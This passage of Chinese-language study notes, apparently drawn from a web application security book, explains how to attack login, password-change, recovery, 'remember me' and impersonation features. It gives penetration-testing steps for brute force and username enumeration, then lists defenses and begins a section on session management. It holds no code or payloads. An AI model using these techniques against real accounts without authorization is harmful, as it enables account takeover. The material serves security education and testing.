<li>如果可以自行注册，用不同种类的脆弱密码注册一下，了解规则；</li>
<li>如果已经有账户，尝试把密码更改为弱密码；</li>
</ul>
<h3 id="蛮力攻击登录"><a href="#蛮力攻击登录" class="headerlink" title="蛮力攻击登录"></a>蛮力攻击登录</h3><p>如果应用程序没有限制用户尝试的次数，则攻击者很容易就会使用蛮力攻击，因为有太多知名站点的沦陷，导致大量的用户密码泄露，它们都可以作为很好的密码库进行暴力尝试；</p>
<blockquote>
<p>管理员密码经常更加脆弱，因为它常常是在应用程序上线之前就已经设置好的，因此经常没有遵守规则；</p>
</blockquote>
<p>有些应用程序会在客户端使用隐藏字段记录尝试失败的次数，然后提交到服务器进行限制，但这种方法太容易被绕开；如果失败次数保留在服务端，也可以通过新开一个会话来绕过这个限制；</p>
<p>有些应用程序会在失败一定次数后锁定账户，让其不能登录，但是它可能仍然对后续的尝试做出正确与否的响应，此时攻击者只要不断尝试，直到找到正确的密码，然后等到解锁的时候，即可登录；</p>
<blockquote>
<h4 id="渗透测试步骤-11"><a href="#渗透测试步骤-11" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>用某个受控账户手动提交几个错误的登录尝试，监控接收到的错误消息；</li>
<li>如果在10次登录失败后，还没有返回锁定消息，再尝试正确的密码，如果登录成功，则说明应用程序并没有采取任何账户锁定策略；</li>
<li>如果账户被锁定，可以尝试使用不同的账户；</li>
<li>如果应用程序发布 cookie，则设置让每个 cookie 只使用一次，之后每次登录尝试获取新 cookie；</li>
<li>如果账户被锁定，应该查看与提交无效密码相比，提交正确密码是否会在响应中存在差异；如果是的话，则即使账户被锁定，仍然可以继续猜测攻击；</li>
<li>如果没有受控账户，尝试枚举一个有效的用户名，并使用它提交几次错误登录，监控账户的错误消息；</li>
<li>发动蛮力攻击前，应先确定好应用程序在成功与失败两种响应的差异，以便分清区别；</li>
<li>列出常见的用户名和密码列表，根据已知的密码规则对其进行过滤，只留下有效的密码，避免无谓的多余尝试；</li>
<li>使用这些用户名和密码的排列组合，使用适当的工具或定制脚本迅速生成登录请求，监控服务器的响应，筛选出那些成功的登录尝试；</li>
<li>如果一次针对几个用户名，最好使用广度优先，而不是深度优先，每个用户名只尝试一次密码，然后轮下一个用户名，这样避免触发单个用户名的失败次数过多的锁定；</li>
</ul>
</blockquote>
<h3 id="详细的失败消息"><a href="#详细的失败消息" class="headerlink" title="详细的失败消息"></a>详细的失败消息</h3><p>失败消息中，有时候会注明是哪一项登录消息无效，例如用户名或者密码，此时就可以利用这个信息，筛选出有效的用户名，供下一轮攻击时使用；</p>
<p>如果应用程序允许用户自行注册并指定自己的用户名，由于应用程序需要排查用户名是否重复，因此攻击者可以利用这一点进行用户名枚举，筛选出有效的用户名；</p>
<p>有些应用程序的登录比较复杂，需要用户提交几组信息，或者分几个步骤，此时详细的失败信息有助于攻击者轮流针对登录过程的每个阶段发动攻击；</p>
<p>同样的用户名错误，页面上可能看起来没有差别，但在 HTML 源代码中可能会有区别，通过“比较”工具找出区别，就可以收获有效的信息；</p>
<blockquote>
<h4 id="渗透测试步骤-12"><a href="#渗透测试步骤-12" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果已经有一个受控账户，使用这个账户的用户名和一个错误的密码登录一次，然后使用完全随机的用户名进行另一次登录；</li>
<li>记录两次登录服务器响应中的每一个细节，包括状态码、重定向、屏幕上显示的信息、页面源代码的差异；使用拦截器保存请求和响应的完整历史记录；</li>
<li>努力找出两次尝试间的任何明显或细微的差异；</li>
<li>如果找不到差异，在应用程序中任何提交用户名的地方重复上述操作，例如注册、密码修改、忘记密码等功能；</li>
<li>如果发现有差异，使用一个常见的用户名列表，用自动工具迅速提交每个用户名，根据响应的差异，筛选出有效的用户名；</li>
<li>开始枚举之前，确定应用程序是否有失败次数达到上限后的锁定策略；如果有，则不应该在枚举时使用不合理的密码，而应提交常见的密码；</li>
</ul>
</blockquote>
<p>即使服务端对有效用户名和无效用户名返回的响应完全相同，它的处理时间也经常是不同的，即有效用户名处理的步骤可能要久一些，而无效用户名要短一些；这种判断方法不一定百分百准确，但从大数来说，有一定的准确概率；</p>
<blockquote>
<p>除了登录功能外，还可以从其他地方获取有效的用户名，例如源代码注释、开发人员的电子邮件、可访问的日志等；</p>
</blockquote>
<h3 id="密码传输易受攻击"><a href="#密码传输易受攻击" class="headerlink" title="密码传输易受攻击"></a>密码传输易受攻击</h3><p>如果应用程序使用非加密的 HTTP 连接传输登录密码，处于网络中适当位置的窃听者就有机会能够拦截这些密码；可能窃听的位置有：</p>
<ul>
<li>用户的本地网络中；</li>
<li>用户的 IT 部门中；</li>
<li>用户的 ISP 内；</li>
<li>因特网骨干网上；</li>
<li>托管应用程序的 ISP 内；</li>
<li>管理应用的 IT 部门内；</li>
</ul>
<p>即使通过 HTTPS 登录，应用程序也有可能使用不安全的方式来处理密码，导致密码可能被泄露：</p>
<ul>
<li>以查询字符串而不是 POST 请求主体中传送密码；这样会导致很多地方都会记录这些信息，例如用户的浏览历史记录、Web服务器日志内、主机基础架构使用的任何反向代理中；如果攻击者能够攻击这些资源，就有机会获得密码；</li>
<li>虽然多数应用开发者使用 POST 提交表单，但登录请求却经常使用 302 重定向到一个不同的 URL 来进行；</li>
<li>有些开发者会将密码保存在 cookie 中，此时攻击者可以通过访问客户端的本地文件系统来获得密码；即使密码被加密也没有关系，直接放入 cookie 中就可以用了；</li>
</ul>
<p>有些应用程序在加载第一个页面时没有使用 HTTPS，而是等到了传输密码时，才使用 HTTPS，这样是有安全隐患的，即用户无法保证第一个加载到的页面是真实的；</p>
<blockquote>
<h4 id="渗透测试步骤-13"><a href="#渗透测试步骤-13" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>进行一次成功登录，监控客户端与服务器之间的所有来回流量；</li>
<li>确定在来回方向传输密码的每一种情况，可通过设置拦截规则，标记包含特殊字符串的信息；</li>
<li>如果发现客户端通过 URL 查询字符串或cookie提交密码，或者由服务端向客户端传输密码，则需要了解其这样做的目的；</li>
<li>查看是否通过非加密渠道传输任何敏感信息；</li>
<li>如果没有发现不安全传输密码的情况，留意任何明显或模糊处理的数据，如果这些数据中包括敏感数据，则可能逆向工程其模糊算法；</li>
<li>例如使用 HTTPS 提交密码，但使用 HTTP 加载登录表单，则有机会使用中间人攻击，通过钓鱼获取密码；</li>
</ul>
</blockquote>
<h3 id="密码修改功能"><a href="#密码修改功能" class="headerlink" title="密码修改功能"></a>密码修改功能</h3><p>很多 Web 应用程序的密码修改功能经常不需要验证就可以访问，并经常给攻击者提供一些重要的信息，例如：</p>
<ul>
<li>过于详细的错误消息，例如说明被请求的用户名是否有效；</li>
<li>允许攻击者无限制猜测现有密码字段；</li>
<li>在验证现有密码后，仅检查“新密码”与“确认新密码”字段的值是否相同，允许攻击者不需入侵即可成功确认现有密码是否正确；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-14"><a href="#渗透测试步骤-14" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>发现和确定应用程序中的所有密码修改功能；有时候它可能是隐藏的；</li>
<li>使用无效的用户名、无效的现有密码及不匹配的“新密码”和“确认新密码”等值，向密码修改功能提交各种请求；</li>
<li>设法确定任何可用于用户名枚举或蛮力攻击的行为；</li>
</ul>
</blockquote>
<p>提示：有时候表面看起来可能没有用户名字段，但它很可能是放在隐藏表单字段中；如果表单字段中也没有，可以尝试使用跟登录功能相同的参数提交一个包含用户名的参数（它有时可以成功覆盖当前用户的用户名，获得向其他用户发起蛮力攻击的机会，即使在主登录页面可能实施不了这个攻击）；</p>
<h3 id="忘记密码功能"><a href="#忘记密码功能" class="headerlink" title="忘记密码功能"></a>忘记密码功能</h3><p>同密码修改功能一样，忘记密码功能经常也会引入枚举漏洞，原因如下：</p>
<ul>
<li>使用质询问题：通过社交网络或其他渠道，可能很容易获取这些质询的答案，它的答案范围比正常的密码范围要小得多；</li>
<li>没有为质询的回答次数进行限制；</li>
<li>使用密码暗示：由于普通用户缺少安全意识，留下的暗示经常相当于明示；另外还可以通过已存在的问题暗示库数据进行枚举破解；</li>
<li>通过质询后，告知旧密码；导致攻击者只要记下质询的答案，即使用户修改了密码后，仍然可以通过质询获得新密码；</li>
<li>通过质询后，跳转到一个无须验证的新会话，导致攻击者即使不知道密码，也马上可以使用该账户了；</li>
<li>通过质询后，将恢复的 URL 发送至质询过程中提供的邮箱，而不是早期注册时预留的邮箱；（有时候邮箱字段并不在界面上显示，而是放在一个隐藏的表单字段或cookie中）；</li>
<li>修改密码后没有给用户发通知，导致用户误以为自己修改了密码，然后重新设置密码，最终无法发现账户已经被攻破了；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-15"><a href="#渗透测试步骤-15" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确认应用程序中的所有忘记密码功能；即使公布的页面中没有这个链接，但很可能仍然有这个功能；</li>
<li>使用受控账户执行一次完整的密码恢复流程，了解其工作机制；</li>
<li>如果恢复机制使用了质询，确定一下是否是让用户自行设定质询和响应，如果是的话，则可以使用质询库来进行匹配；</li>
<li>如果恢复机制使用暗示，使用已公开的暗示库，选择那些最容易猜测的暗示进行攻击；</li>
<li>尽量找出忘记密码机制中任何可用于用户名枚举或蛮力攻击的行为；</li>
<li>如果应用程序使用发送恢复 URL 的机制，则收集尽可能多的这类 URL ，然后找出规律，预测向其他用户发布 URL 的模式（可使用分析会话令牌相同的技巧）；</li>
</ul>
</blockquote>
<h3 id="“记住我”功能"><a href="#“记住我”功能" class="headerlink" title="“记住我”功能"></a>“记住我”功能</h3><h4 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h4><ul>
<li>在 cookie 中存放用户名，然后服务端简单相信该 cookie，没有进行验证；</li>
<li>在 cookie 中存放的会话标识没加密，此时可以通过推断其他用户的会话标识进行登录尝试；</li>
<li>在 cookie 中存放的会话标识有加密，此时可以尝试通过跨脚点脚本的漏洞获取这些标识；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-16"><a href="#渗透测试步骤-16" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>激活所有”记住我”功能，确定应用程序是否记住了用户名和密码，还是只记了用户名，之后仍然需要输入密码；如果是后者，则此功能可能没有太大的漏洞；</li>
<li>仔细检查 cookie 值以及其他在本地存储的数据，寻找其中可能标识出用户或明显包含可预测用户标识的数据；</li>
<li>即使其中保存的数据经过了加密或模糊处理，通过比较几个非常类似的用户或密码的结果，有可能可以找到逆向工程的机会；</li>
<li>尝试修改持久性 cookie 的值，让服务端认为有另外一名用户在客户端登录过；</li>
</ul>
</blockquote>
<h3 id="用户伪装功能"><a href="#用户伪装功能" class="headerlink" title="用户伪装功能"></a>用户伪装功能</h3><p>一些应用程序允许特权用户伪装成普通用户，然后以该用户的权限访问数据和执行操作，例如银行或电信客户，在获得用户的电话口头验证后，切换到用户账户权限进行操作；常见的设计缺陷如下：</p>
<ul>
<li>伪装功能可能通过“隐藏”的形式执行，且不受常规访问控制的管理，只要猜出 URL 即可访问使用；</li>
<li>服务端可能会信任当前有效 cookie 提交的任何数据，并切换到伪装账户的权限进行操作；</li>
<li>如果管理员也可以被伪装，则任何缺陷都可能导致垂直权限提升的漏洞，导致攻击不仅可以访问其他用户的数据，还可以控制整个应用程序；</li>
<li>有些伪装功能能够以“后门”密码（或者叫万能密码）进行执行；攻击者可以在实施标准攻击的过程中，通过枚举发现这个密码</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-17"><a href="#渗透测试步骤-17" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>确定应用程序中的所有伪装功能，即使公布的内容中没有明确的伪装功能链接；</li>
<li>尝试使用伪装功能伪装成其他用户；</li>
<li>设法操纵由伪装功能处理的用户提交的数据，尝试伪装成其他用户，特别留意任何不通过正常登录页面提交用户名的情况；</li>
<li>如果能够成功利用伪装功能，尝试伪装成任何已知的或猜测出的管理用户，以提交用户权限；</li>
<li>实施密码猜测攻击时，查看是否有用户使用多个有效密码，或者某个特殊的密码是否与几个用户名匹配；特别注意任何 “以 X 登录”的状态消息；用在蛮力攻击中获得的密码，以许多不同的用户登录，检查是否一切正常；</li>
</ul>
</blockquote>
<h3 id="密码确认不完善"><a href="#密码确认不完善" class="headerlink" title="密码确认不完善"></a>密码确认不完善</h3><p>应用程序对密码的要求会显著影响密码池的大小，攻击者通过对密码限制进行分析，可以删除密码库中不符合条件的密码，从而加快了枚举的速度；</p>
<blockquote>
<h4 id="渗透测试步骤-18"><a href="#渗透测试步骤-18" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个受控账户，尝试使用密码的各种变化形式进行登录，例如删除最后一个字符、改变字符大小写、删除任何特殊排版的字符，以了解完整的密码确认规则；</li>
<li>利用规则，调整自动攻击的配置，删除多余的密码，提高成功的效率；</li>
</ul>
</blockquote>
<h3 id="非唯一性用户名"><a href="#非唯一性用户名" class="headerlink" title="非唯一性用户名"></a>非唯一性用户名</h3><p>非唯一性用户名还是比较少见的，可以通过多次使用同一用户名注册，来判断是否有唯一性的限制；</p>
<p>如果存在唯一性的限制，则可以通过大量注册常见的用户名，来获取哪些用户名是有人在用的；</p>
<blockquote>
<h4 id="渗透测试步骤-19"><a href="#渗透测试步骤-19" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序允许自我注册，尝试用不同密码两次注册同一个用户名；</li>
<li>如果应用程序不允许用户名重复，则可以用常见的用户名反复注册，以找到已注册的用户名；</li>
<li>如果应用程序允许用户名重复，尝试使用相同的密码，注册两个相同用户名，看应用程序会如何反应；</li>
<li>如果报错，使用某个有效的用户名，则尝试使用一组常用密码多次注册该用户名，如果应用程序拒绝某个特殊的密码，则可以发现用户名的现有密码；</li>
<li>如果没有报错，使用指定的密码登录，看看出现了什么结果；此时需要在每个账户中保存不同的数据以进行区分，之后才能确定这种行为是否可以导致跨账户的权限；</li>
</ul>
</blockquote>
<h3 id="可预测的用户名"><a href="#可预测的用户名" class="headerlink" title="可预测的用户名"></a>可预测的用户名</h3><p>有些应用程序根据某种可以预测的顺序自动生成账户用户名，在找到规律后，即可以很快获得全部的有效用户名；</p>
<h3 id="可预测的初始密码"><a href="#可预测的初始密码" class="headerlink" title="可预测的初始密码"></a>可预测的初始密码</h3><p>一些应用程序一次性或大批量创建用户，并自动指定初始密码，然后分配给所有用户；</p>
<blockquote>
<p>渗透测试步骤</p>
<ul>
<li>设法获得几个连续的密码，看能否从中看出任何顺序规律；</li>
<li>如果有规律，根据规律，获取其他应用程序用户的密码；</li>
<li>如果密码看起来跟用户名关联，使用已知的用户名或猜测出的用户名，用推断出的密码尝试进行登录验证；</li>
<li>可以使用推断出的密码列表作为后续实施蛮力攻击的基础；</li>
</ul>
</blockquote>
<h3 id="密码分配不安全"><a href="#密码分配不安全" class="headerlink" title="密码分配不安全"></a>密码分配不安全</h3><p>由于人性懒惰，如果应用程序没有要求用户修改初始密码，则大部分用户都不会更改初始密码；</p>
<p>有些应用程序不分配密码，而是发送一个激活链接，用户点击后，开始设置初始密码；这个链接很可能存在某种规律，攻击者可以通过注册几个紧密相连的用户，来确定其中的规律；</p>
<p>有些应用程序更搞笑，在用户修改密码后，还会发一封邮件通知用户该新设置的密码是多少；</p>
<blockquote>
<h4 id="渗透测试步骤-20"><a href="#渗透测试步骤-20" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>获得一个新账户，如果应用程序没有要求在注册阶段设置密码，则需要弄清应用程序如何分配密码；</li>
<li>如果应用程序使用激活 URL，则尝试注册几个紧密相关的新账户，从中寻找 URL 存在的规律；找到规律后，尝试使用这些 URL 占领其他用户的账户；</li>
<li>尝试多次重复使用同一个激活 URL，看应用程序如何反应；如果被拒绝，则尝试输入多次的错误密码，将受控账户锁定，然后重复使用 URL，看是否可行；</li>
</ul>
</blockquote>
<h2 id="验证机制执行缺陷"><a href="#验证机制执行缺陷" class="headerlink" title="验证机制执行缺陷"></a>验证机制执行缺陷</h2><h3 id="故障开放登录机制"><a href="#故障开放登录机制" class="headerlink" title="故障开放登录机制"></a>故障开放登录机制</h3><p>当验证不通过时，服务端的处理可能存在缺陷，例如错误的用户密码仍然可以登录，只是没有完整的功能，这样会导致一些数据泄露；</p>
<blockquote>
<h4 id="渗透测试步骤-21"><a href="#渗透测试步骤-21" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用受控账户执行一次完整、有效的登录；使用拦截器记录提交的每一份数据，收到的每一个响应；</li>
<li>多次重复登录过程，以非常规方式修改提交的数据；包括：提交一个空字符串值、完全删除键值对、提交非常长和非常短的值、提交字符串代替数字或反过来、以相同和不同的值多次提高同一个数据项；</li>
<li>仔细检查服务器对每次畸形请求的响应，确定任何不同于基本情况的差异；</li>
<li>根据观察到的结果，调整测试过程；如果某个修改造成了行为的改变，设计将这个修改与其他修改进行组合，使应用程序的逻辑判断达到最大限度，以暴露其中可能存在的逻辑漏洞；</li>
</ul>
</blockquote>
<h3 id="多阶段登录机制中的缺陷"><a href="#多阶段登录机制中的缺陷" class="headerlink" title="多阶段登录机制中的缺陷"></a>多阶段登录机制中的缺陷</h3><p>多阶段本意是想提高安全性，但是容易出现逻辑缺陷；开发人员经常会做出一些潜在的危险假设，包括：</p>
<ul>
<li>应用程序认为访问第三阶段的用户已经完成了前两个阶段的认证；</li>
<li>应用程序可能会信任由第二阶段提交的数据，因为到达第二阶段表示通过了第一阶段的认证；</li>
<li>应用程序认为每个阶段的用户身份不变发生变化，因此并没有在每个阶段确认用户身份；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-22"><a href="#渗透测试步骤-22" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>使用一个受控账户执行一次完整的多步骤登录，用拦截器记录提交的每一份数据；</li>
<li>检查是否不止一次收到某条信息，或者是否有信息被返回给客户端，并通过隐藏表单字段、cookie或者预先设置的 URL 参数重新提交；</li>
<li>使用各种畸形请求多次重复登录过程：包括：尝试按不同的顺序完成登录步骤、尝试直接进入任何特定的阶段从那里继续登录、尝试省略每个阶段并从下一阶段继续登录、发挥想象力想出开发者无法预料的方式访问不同的阶段；</li>
<li>如果有数据不止提交一次，尝试在另外一个阶段提交一个不同的值，看是否能够成功登录；有些数据在某个阶段得到确认后，随后就被应用程序所信任；在这种情况下，可先用一个用户名通过第一阶段，再使用另一个用户名登录第二个阶段；</li>
<li>特别注意任何通过客户端传送，但不需要用户直接输入的数据，应用程序很有可能使用它们来保存登录的进度状态并且信任这些数据；</li>
</ul>
</blockquote>
<p>有些登录机制在用户名和密码验证后，会提出一个随机私密问题，要求用户进行回答；但有时候存在两个设计漏洞：</p>
<ul>
<li>应用程序将问题细节放在隐藏字段中，而没有保留在服务器上，使得攻击者可以自动选择回答哪个问题；</li>
<li>应用程序没有记录用户回答错误的记录，因此攻击者有机会遍历所有问题，然后找一个可以回答的；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-23"><a href="#渗透测试步骤-23" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>如果应用程序使用了随机问题，检查问题本身是否和回答一起请求，如果是的话，尝试改变问题并提交正确答案，看能否成功登录；</li>
<li>如果应用程序不允许攻击者提交任意问题，则使用同一个账户反复进入这个问题，枚举所有存在的问题；有时应用程序会使用持久性的 cookie 让问题保持不变，此时只需要改变 cookie 即可以绕过限制；</li>
</ul>
</blockquote>
<h3 id="不安全的密码存储"><a href="#不安全的密码存储" class="headerlink" title="不安全的密码存储"></a>不安全的密码存储</h3><p>应用程序常常以危险的方式将用户密码保存在数据库中，例如以明文存储；即使使用 MD5 或者 SHA-1 等算法进行散列处理，攻击者仍然可以在预先计算的散列值数据库查找观察到的散列；另外，由于应用程序使用的数据库账户需要随时读写这些密码，因此存在其他漏洞导致可以访问这些密码的风险；</p>
<blockquote>
<h4 id="渗透测试步骤-24"><a href="#渗透测试步骤-24" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>分析应用程序有所有与用户验证或维护有关的功能，如果发现服务端有返回用户的密码，则说明用户的密码是明文存储的，或者使用了某种可还原的加密形式保存密码；</li>
<li>如果发现应用程序中存在任意一种命令或执行查询的漏洞，则设法弄清楚应用程序将用户密码保存在数据库或文件系统中的什么位置；找到这些位置，弄清应用程序是否以非加密形式保存密码；如果以散列形式存储密码，则检查是否分配账户时常用或默认密码，以及未经过加盐处理的散列值；如果没有加盐，则可以查询在线散列数据库，以确定对应的明文密码值；</li>
</ul>
</blockquote>
<h2 id="保障验证机制的安全"><a href="#保障验证机制的安全" class="headerlink" title="保障验证机制的安全"></a>保障验证机制的安全</h2><p>不同的验证方案有不同的优缺点，在追求安全性的基础上，有时候需要牺牲功能、易用性和总成本等；因此，决策者需要在不同的方案和目标之间做好权衡，评估所付出的安全成本，是否能够被足够的收益所抵销；</p>
<h3 id="使用可靠的密码"><a href="#使用可靠的密码" class="headerlink" title="使用可靠的密码"></a>使用可靠的密码</h3><ul>
<li>强制执行适应的最小密码强度要求，包括最小长度、使用字母+数字+特殊字符，同时使用大小写，避免使用单词、名称和常见密码，避免使用用户名为密码，避免使用和以前的密码相似或相同的密码；</li>
<li>应使用唯一的用户名；</li>
<li>系统生成的任何用户名和密码应具有足够的随机性，不包含任何顺序，以便攻击者无法进行预测；</li>
<li>允许用户设置足够强大的密码，例如增加长度和特殊字符；</li>
</ul>
<h3 id="安全处理密码"><a href="#安全处理密码" class="headerlink" title="安全处理密码"></a>安全处理密码</h3><ul>
<li>使用不会造成泄露的方式创建、保存和传送所有密码；</li>
<li>使用 SSL 保护客户端和服务端之间的通信；</li>
<li>在加载登录表单页面即使用 HTTPS ，而不是在提交登录信息时，才切换到 HTTPS；</li>
<li>只使用 POST 请求向服务器传输密码，绝不将密码放在 URL 或者 cookie 中；绝不将密码返回给客户端；</li>
<li>不将密码的原始值保存在数据库中，使用强大的散列函数加盐后保存，以便攻击者即使获得密码后也无法还原；</li>
<li>客户的“记住我”功能仅限于记住用户名，不可用于记住密码；</li>
<li>要求用户定期修改密码；</li>
<li>如果需要给用户分配密码，则应该以尽可能安全的方式传输密码，并设置时间限制，同时要求用户在第一次登录时更改密码，并告知用户在初次使用后销毁原始通信记录；</li>
</ul>
<h3 id="正确确认密码"><a href="#正确确认密码" class="headerlink" title="正确确认密码"></a>正确确认密码</h3><ul>
<li>应确认完整的密码，不过滤、截短或修改任何密码；</li>
<li>应用程序需要在登录处理过程中捕获所有异常并处理异常，出现异常后，应当删除用于控制登录状态的所有会话和相关数据，并使当前会话失效，以便让攻击者的会话强制退出；</li>
<li>严格审查验证逻辑的伪代码和源代码，避免其中存在任何的逻辑漏洞；</li>
<li>如果应用程序存在伪装功能，应该严格限制这种功能，防止攻击者利用它获得未授权的访问；该功能不得公开访问，仅限于内部访问；对访问方式进行严格审核和控制；</li>
<li>对阶段登录进行严格控制，防止攻击破坏各个阶段的转换与关系；<ul>
<li>登录阶段的进度和上一阶段的结果应该只保存在服务端，绝不可以传送到客户端；</li>
<li>禁止用户多次提交一项登录信息；</li>
<li>禁止用户修改已经被收集或确认的数据；如果某个数据需要在各个阶段重复使用，应该保存在会话中进行引用；</li>
<li>每个登录阶段都应该先核实前面的阶段已经顺利完成，如果发现前面的阶段没有完成，应该将验证标记为恶意尝试；</li>
<li>为避免攻击者知悉是哪个阶段登录失败，即使用户无法完成前面的阶段，即使最初的用户名无效，应用程序也应该总是走完所有的登录阶段，之后再呈现登录失败的信息，同时不提供关于失败位置的任何信息；</li>
</ul>
</li>
<li>如果在登录过程中需要回答一个随机的问题，需要确保攻击者无法选择问题；<ul>
<li>如果已经向一个用户提出一个特定的问题，将该问题永久性的保存到用户资料中，确保每次该用户尝试登录时提出相同的问题，直到该用户正确回答了这个问题；（这种方式也是有漏洞，即攻击者可以利用这个机制来枚举有效的用户名，因为无效的用户名没有存储问题）；</li>
<li>如果向某个用户提出一个随机变化的质询，而问题应该保存在服务端，禁止保存到 HTML 的隐藏字段中，并根据保存的问题，核实用户提供的答案；</li>
</ul>
</li>
</ul>
<h3 id="防止信息泄露"><a href="#防止信息泄露" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h3><ul>
<li>应用程序使用的各种验证机制不应泄露关于验证的参数信息，以便攻击者无法判断是哪项提交的数据出了问题；</li>
<li>使用一个统一的组件来负责响应所有的失败消息，确保失败消息总是呈现一致性，以避免攻击者利用不一致来获得信息；</li>
<li>如果应用程序使用账户锁定机制，则该机制可被利用来枚举有效的用户名；</li>
<li>如果应用程序支持自我注册，则该机制可被利用来枚举有效的用户名；因此应要求用户使用电子邮件进行注册，当用户注册后，发邮件到其邮箱，通知注册结果；如果用户已经注册过了，就在邮件中说明已注册，如果用户未注册，就在邮件中放上一个唯一的 URL 让用户继续完成余下的注册步骤；</li>
</ul>
<h3 id="阻止蛮力攻击"><a href="#阻止蛮力攻击" class="headerlink" title="阻止蛮力攻击"></a>阻止蛮力攻击</h3><ul>
<li>当用户失败超过一定次数后，可将账户冻结一定的时间，例如30分钟；这样做算是一个折中，避免非常规激活给用户增加太多的成本，也给攻击者增加成本；<ul>
<li>应用程序不得透露任何关于存在冻结的信息，仅仅是提示有这种可能性即可；</li>
<li>应用程序不得透露冻结的时间；</li>
<li>如果账户被冻结，应用程序不再检查用户密码，直接拒绝登录尝试；</li>
</ul>
</li>
<li>账户冻结措施不能万无一失，因为即使是5次的失败机会，也意味着攻击者有4次尝试不会引起锁定；</li>
<li>在需要验证的页面使用 CAPTCHA 质询，用来防止自动化的数据提交（不过现在也出现了很多破解 CAPTCHA 的工具，它只能用来提高攻击成本，吓退那些随意的攻击者）（有时候 CAPTCHA 的答案还会隐藏在表单字段中，使得攻击者不用解题即可以获得答案）；</li>
</ul>
<h3 id="防止滥用密码修改功能"><a href="#防止滥用密码修改功能" class="headerlink" title="防止滥用密码修改功能"></a>防止滥用密码修改功能</h3><ul>
<li>应用程序必须设计密码修改功能，以便让用户定期修改密码；</li>
<li>只能从已经通过验证的会话中访问该功能；</li>
<li>不应以任何形式直接提供用户名，如隐藏的表单字段或者 cookie；企业修改他人密码的为定为非法行为；</li>
<li>要求用户修改密码时同时输入现有密码，以避免会话劫持漏洞、跨站点脚本攻击等；</li>
<li>为防止错误，新密码应该要求用户输入两次；</li>
<li>当尝试失败时，应使用常规错误消息告知错误，不能泄露错误的原因，如果出现多次失败，应临时冻结该功能；</li>
<li>应使用非常规的方式，通知用户密码已经修改，并且在通知中不得包含新密码或旧密码的信息；</li>
</ul>
<h3 id="防止滥用账户恢复功能"><a href="#防止滥用账户恢复功能" class="headerlink" title="防止滥用账户恢复功能"></a>防止滥用账户恢复功能</h3><ul>
<li>通过电子邮件向用户发送一条唯一的、有时间限制的、无法猜测的随机性 URL 帮助用户重新控制账户；当用户恢复账户后，再发送一封电子邮件通知用户密码已经修改；在用户的新密码修改成功前，旧密码应保持有效；</li>
<li>绝对避免使用密码“暗示”之类的功能，因为很多用户自己设置的暗示跟明示差不多；</li>
</ul>
<h3 id="日志、监控与通知"><a href="#日志、监控与通知" class="headerlink" title="日志、监控与通知"></a>日志、监控与通知</h3><p>应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重设、账户冻结与账户恢复，日志中应包含一切相关的细节（如用户名和 IP 地址），但不得记录任何机密信息（例如密码）；应用程序应为日志提供强有力的保护，以防止未授权的访问，因为它们是信息泄露的主要源头；</p>
<ul>
<li>当出现异常事件时，应用程序应进行实时警报和主动入侵防御；</li>
<li>应以非常规的方式通知用户任何重大的安全事件，例如在用户尝试修改密码后，向其发送邮件进行告知；</li>
<li>应以非常规的方式告知用户其上次登录的时间和位置，以及在那之后无效登录的次数，以便让用户知悉其账户很可能正在遭受蛮力攻击，保存其设置更加安全的密码；</li>
</ul>
<h2 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h2><p>验证功能是应用程序受攻击面中最重要的目标，匿名用户可以直接访问该功能，使得其很容易暴露在所有攻击者面前；现实的验证机制存在着大量的设计与执行缺陷，使用系统化的方法尝试各种攻击途径，即可以对这些缺陷发起全面有效的攻击；</p>
<p>许多时候，漏洞显得易见；另一方面，有些缺陷隐藏得很深，需要对登录过程的逻辑进行反复推敲和分析，才能发现并利用这些缺陷；</p>
<h1 id="7-攻击会话管理"><a href="#7-攻击会话管理" class="headerlink" title="7. 攻击会话管理"></a>7. 攻击会话管理</h1><h2 id="状态要求"><a href="#状态要求" class="headerlink" title="状态要求"></a>状态要求</h2><p>会话机制中存在两大类的漏洞：</p>
<ul>
<li>生成会话过程中的漏洞；</li>
<li>处理会话过程中的漏洞；</li>
</ul>
<blockquote>
<h4 id="渗透测试步骤-25"><a href="#渗透测试步骤-25" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h4><ul>
<li>应用程序经常在多个地方使用会话，包括 cookie、 URL 参数、隐藏表单字段等，以适应不同功能的状态判断需要，避免只检查一个地方；</li>
<li>有时候由 Web 服务器生成的标准会话令牌只是例行动作，并不定表示它一定会被应用程序所使用；</li>
<li>当用户经过验证后，仔细检查客户端收到哪些新的数据项，一般来说，应用程序在此时建立新的会话令牌；</li>
<li>找一个确定需要使用会话令牌数据的页面，例如个人资料页，尝试性的删除某个疑似令牌的数据后提交请求，如果返回的页面出现变化，不再是原来的那个页面，则说明该数据很可能为会话令牌；</li>
</ul>
</blockquote>
<p>并不是每个应用程序都会使用会话，有也其他替代方案可以用来进行状态</p>
<ul>
<li>HTTP 验证：客户端在每次请求中，都在消息头中重复提交密码进行验证；</li>
